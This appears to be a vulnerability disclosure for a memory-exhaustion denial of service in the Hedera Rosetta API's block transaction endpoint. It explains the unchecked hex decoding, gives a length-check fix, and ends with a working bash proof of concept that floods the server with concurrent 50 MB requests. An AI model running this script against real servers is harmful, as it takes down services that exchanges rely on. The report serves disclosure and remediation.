### Title
Unbounded Memory Allocation via Oversized `TransactionIdentifier.Hash` in `BlockTransaction()` Leading to Denial of Service

### Summary
The `BlockTransaction()` handler in `rosetta/app/services/block_service.go` passes `request.TransactionIdentifier.Hash` directly to `FindByHashInBlock()` without any length validation. Inside `FindByHashInBlock()`, `hex.DecodeString()` is called on the attacker-controlled string, allocating heap memory proportional to the input length. With no application-level body size cap and a permissive 5-second read timeout, an unprivileged attacker can flood the server with concurrent requests carrying multi-megabyte hex strings, exhausting process memory and denying service to legitimate users.

### Finding Description

**Code path:**

`BlockTransaction()` — `rosetta/app/services/block_service.go` lines 87–92:
```go
transaction, err := s.FindByHashInBlock(
    ctx,
    request.TransactionIdentifier.Hash,   // ← raw, unbounded user input
    block.ConsensusStartNanos,
    block.ConsensusEndNanos,
)
```

`FindByHashInBlock()` — `rosetta/app/persistence/transaction.go` lines 179–183:
```go
var transactions []*transaction
transactionHash, err := hex.DecodeString(tools.SafeRemoveHexPrefix(hashStr))
if err != nil {
    return nil, hErrors.ErrInvalidTransactionIdentifier
}
```

**Root cause:** `hex.DecodeString` allocates a `[]byte` of length `len(input)/2`. There is no upper-bound check on `hashStr` before this call. `SafeRemoveHexPrefix` only strips a two-character prefix; it performs no length check. The error branch only fires for non-hex characters or an odd-length string — a valid even-length hex string of any size passes through silently.

**Exploit flow:**
1. Attacker obtains any valid `BlockIdentifier` (public on-chain data).
2. Attacker crafts a `BlockTransactionRequest` with `TransactionIdentifier.Hash` set to, e.g., 50 MB of valid hex characters (`"aa"` repeated 25 million times).
3. The server reads the body within the 5-second `ReadTimeout` (default `5,000,000,000 ns` — `docs/configuration.md` line 664).
4. `FindByIdentifier` succeeds (valid block), so execution reaches `FindByHashInBlock`.
5. `hex.DecodeString` allocates ~25 MB on the heap per request.
6. With up to 100 concurrent DB connections (`maxOpenConnections: 100`, `docs/configuration.md` line 658), 100 simultaneous requests allocate ~2.5 GB, exhausting server memory.

**Why existing checks fail:**
- `ReadTimeout` (5 s) limits transfer time, not payload size; on a 100 Mbps link ~62 MB arrives in 5 s.
- The `http.Server` in `main.go` (lines 220–227) sets no `http.MaxBytesReader` on the request body.
- The Traefik rate-limit/in-flight middleware (`values.yaml` lines 152–160) is an optional Kubernetes deployment artifact, absent in bare-metal or direct deployments.
- `hex.DecodeString` only rejects non-hex or odd-length input — it imposes no size limit.

### Impact Explanation
Repeated concurrent requests with large hex strings exhaust Go process heap memory, triggering OOM termination or severe GC pressure. This prevents all legitimate `/block/transaction` (and potentially other) requests from being served, constituting a complete denial of service against the Rosetta API. Because the Rosetta API is used by exchanges to read Hashgraph history, this disrupts exchange integrations and could be used to suppress visibility of specific transactions.

### Likelihood Explanation
No authentication or API key is required — the `/block/transaction` endpoint is fully public. Valid block identifiers are trivially obtained from `/network/status` or `/block`. The attacker needs only a network connection and a script sending concurrent HTTP POST requests. The attack is repeatable and cheap: each request costs the attacker negligible bandwidth while costing the server significant memory. This is a realistic, low-skill attack.

### Recommendation
Add an explicit length guard in `FindByHashInBlock` before calling `hex.DecodeString`:

```go
const maxTransactionHashHexLen = 96 // 48 bytes * 2 hex chars, matching domain max
func (tr *transactionRepository) FindByHashInBlock(...) {
    stripped := tools.SafeRemoveHexPrefix(hashStr)
    if len(stripped) > maxTransactionHashHexLen {
        return nil, hErrors.ErrInvalidTransactionIdentifier
    }
    transactionHash, err := hex.DecodeString(stripped)
    ...
}
```

Additionally, wrap the HTTP request body with `http.MaxBytesReader` in the server setup (e.g., 1 MB limit) to provide defense-in-depth at the transport layer.

### Proof of Concept

```bash
# 1. Obtain a valid block identifier
BLOCK=$(curl -s -X POST http://<rosetta-host>:5700/network/status \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"}}' \
  | jq -r '.current_block_identifier | "\(.index) \(.hash)"')
INDEX=$(echo $BLOCK | cut -d' ' -f1)
HASH=$(echo $BLOCK | cut -d' ' -f2)

# 2. Generate a 50 MB valid hex string
BIGHASH=$(python3 -c "print('aa' * 25000000)")

# 3. Send 50 concurrent requests
for i in $(seq 1 50); do
  curl -s -X POST http://<rosetta-host>:5700/block/transaction \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
         \"block_identifier\":{\"index\":$INDEX,\"hash\":\"$HASH\"},
         \"transaction_identifier\":{\"hash\":\"$BIGHASH\"}}" &
done
wait
# Observe server OOM / unresponsiveness
```
